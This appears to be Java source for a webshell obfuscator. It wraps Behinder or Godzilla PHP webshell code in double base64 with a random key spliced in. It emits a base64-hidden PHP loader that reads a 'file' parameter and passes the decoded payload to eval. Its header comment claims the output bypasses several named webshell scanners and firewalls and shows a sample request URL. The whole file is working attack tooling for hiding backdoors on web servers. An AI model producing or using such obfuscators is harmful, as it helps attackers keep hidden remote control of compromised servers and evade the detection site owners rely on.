package encode;

import application.RandomString;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Random;

public class PhpEncodeDemo2 {
    String tamplate;
    String sourcecode;
    String key;
    String MScode;

    public PhpEncodeDemo2() {
    }

    public PhpEncodeDemo2(String tamplate, String sourcecode, String key) {
        this.tamplate = tamplate;
        this.sourcecode = sourcecode;
        this.key = key;
    }

    public static String GetDescribe(){
        return "/*\n" +
                " * By: XG小刚\n" +
                " * Time: 2023-09-03_demo2\n" +
                " * Bypass: 牧云、伏魔、安全狗、D盾、河马本地\n" +
                " * 传参: /xxxx.php?file=QzpccGhwU3R1ZHlcUEhQVHV0b3JpYWxcV1dXXDEyMy5waHA=\n" +
                " * file参数为响应头中serve值\n" +
                " */";
    }

    public String[] Run(){

        if(!sourcecode.isEmpty()){
            try {
                sourcecode = sourcecode.replace("<?php", "").replace("?>", "").trim();
                byte[] bytes = sourcecode.getBytes(StandardCharsets.UTF_8);

                String base64code = Base64.getEncoder().encodeToString(Base64.getEncoder().encode(bytes));
                if(this.key.equals("默认随机")){
                    this.key = RandomString.getRString(8);
                }

                StringBuilder stringBuilder = new StringBuilder(base64code);
                int aa = new Random().nextInt((stringBuilder.length())/2)+1;
                for (int i = aa;  i > 0; i = new Random().nextInt(i)) {
                    stringBuilder.insert(i,this.key);
                }
                base64code = stringBuilder.toString();

                String demo = "PD9waHAgLyoka2V5JCovCmhlYWRlcignU2VydmU6Jy5iYXNlNjRfZW5jb2RlKF9fRklMRV9fKSk7CiRwYXNzd29yZD0nJGJhc2U2NGNvZGUkJzsKb2Jfc3RhcnQoKTsKcmVhZGZpbGUoYmFzZTY0X2RlY29kZSgkX0dFVFsnZmlsZSddKSk7CiRmaWxlID0gb2JfZ2V0X2NvbnRlbnRzKCk7Cm9iX2VuZF9jbGVhbigpOwokdXNlcm5hbWUgPSBzdWJzdHIoJGZpbGUsOCw4KTsKJHRlbXBsYXRlX3NvdXJjZSA9IHN0cl9yZXBsYWNlKCR1c2VybmFtZSwnJywkcGFzc3dvcmQpOwokdGVtcGxhdGVfc291cmNlID0gYmFzZTY0X2RlY29kZSgkdGVtcGxhdGVfc291cmNlKTsKJHRlbXBsYXRlX3NvdXJjZSA9IGJhc2U2NF9kZWNvZGUoJHRlbXBsYXRlX3NvdXJjZSk7CiRrZXkgPSAndGVtcGxhdGVfc291cmNlJzsKJGFlc19kZWNvZGVbMV09JCRrZXk7CkBldmFsKCRhZXNfZGVjb2RlWzFdKTs=";
                MScode = new String(Base64.getDecoder().decode(demo));

                MScode = MScode.replace("$key$",this.key);
                MScode = MScode.replace("$base64code$",base64code);

                return new String[]{this.MScode,""};
            }catch (Exception e){
                return new String[]{"加密失败",""};
            }
        }else {
            return new String[]{"请输入冰蝎、哥斯拉php源码",""};
        }
    }
}
